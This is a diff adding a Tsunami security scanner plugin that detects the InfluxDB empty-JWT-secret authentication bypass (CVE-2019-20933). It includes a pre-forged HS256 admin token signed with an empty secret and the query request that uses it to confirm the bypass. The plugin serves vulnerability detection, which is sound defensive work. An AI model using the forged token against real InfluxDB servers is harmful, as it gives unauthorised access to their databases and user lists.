@@ -1,0 +1,165 @@
+# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "InfluxDB_CVE_2019_20933"
+  author: "Google"
+  version: "1.0"
+  description: "Detects InfluxDB < 1.7.6 empty JWT SharedSecret authentication bypass (CVE-2019-20933)."
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2019_20933"
+  }
+  severity: CRITICAL
+  title: "InfluxDB Empty JWT Secret Key Authentication Bypass (CVE-2019-20933)"
+  description:
+    "InfluxDB versions prior to 1.7.6 contain an authentication bypass"
+    " vulnerability in services/httpd/handler.go when HTTP authentication is"
+    " enabled (auth-enabled = true) and shared-secret is left at its default"
+    " empty string. An unauthenticated remote attacker can forge HS256 JWT"
+    " Bearer tokens signed with an empty HMAC secret to bypass authentication"
+    " and execute arbitrary InfluxQL queries."
+  recommendation: "Upgrade InfluxDB to version 1.7.6 or later, or configure a strong non-empty shared-secret under the [http] section of influxdb.conf."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2019-20933"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "verify_influxdb_auth_enabled"
+  action_phase: ACTION_PHASE_FINGERPRINT
+  http_request: {
+    method: POST
+    uri: "/query"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
+    ]
+    data: "q=SHOW+USERS"
+    response: {
+      http_status: 401
+      expect_all: {
+        conditions: [
+          { body: {} contains: "unable to parse authentication credentials" }
+        ]
+      }
+      extract_any: {
+        patterns: [
+          {
+            variable_name: "influxdb_header"
+            regexp: "^([vV]?[0-9]+\\.[0-9]+.*)$"
+            from_header: { name: "X-Influxdb-Version" }
+          },
+          {
+            variable_name: "influxdb_header"
+            regexp: "^(OSS|Enterprise.*)$"
+            from_header: { name: "X-Influxdb-Build" }
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "verify_invalid_jwt_signature_rejected"
+  http_request: {
+    method: POST
+    uri: "/query"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Authorization" value: "Bearer {{ invalid_hmac_jwt }}" }
+    ]
+    data: "q=SHOW+USERS"
+    response: {
+      http_status: 401
+      expect_all: {
+        conditions: [
+          { body: {} contains: "signature is invalid" }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "verify_empty_secret_jwt_bypass"
+  http_request: {
+    method: POST
+    uri: "/query"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Authorization" value: "Bearer {{ empty_secret_admin_jwt }}" }
+    ]
+    data: "q=SHOW+DATABASES%3BSHOW+USERS"
+    response: {
+      expect_any: {
+        conditions: [
+          { body: {} contains: "\"results\":[{\"statement_id\":0" },
+          { body: {} contains: "{\"error\":\"user not found\"}" }
+        ]
+      }
+      extract_any: {
+        patterns: [
+          {
+            variable_name: "influxdb_bypass_header"
+            regexp: "^([vV]?[0-9]+\\.[0-9]+.*)$"
+            from_header: { name: "X-Influxdb-Version" }
+          },
+          {
+            variable_name: "influxdb_bypass_header"
+            regexp: "^(OSS|Enterprise.*)$"
+            from_header: { name: "X-Influxdb-Build" }
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    # HS256 JWT {"username":"admin","exp":4102444800} signed with non-empty dummy key "tsunami_invalid_hmac_key_check".
+    {
+      name: "invalid_hmac_jwt"
+      value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo0MTAyNDQ0ODAwfQ.L8ss3NPOJA0eQHM4tLAQFUeWeniKp-zXBqLY9Nte40U"
+    },
+    # HS256 JWT {"username":"admin","exp":4102444800} signed with empty SharedSecret "".
+    {
+      name: "empty_secret_admin_jwt"
+      value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo0MTAyNDQ0ODAwfQ.d0X7P6y7ysSyL91Rv5cSBxUAxXOVIQEPtqrDdJSIs-g"
+    }
+  ]
+  actions: [
+    "verify_influxdb_auth_enabled",
+    "verify_invalid_jwt_signature_rejected",
+    "verify_empty_secret_jwt_bypass"
+  ]
+}
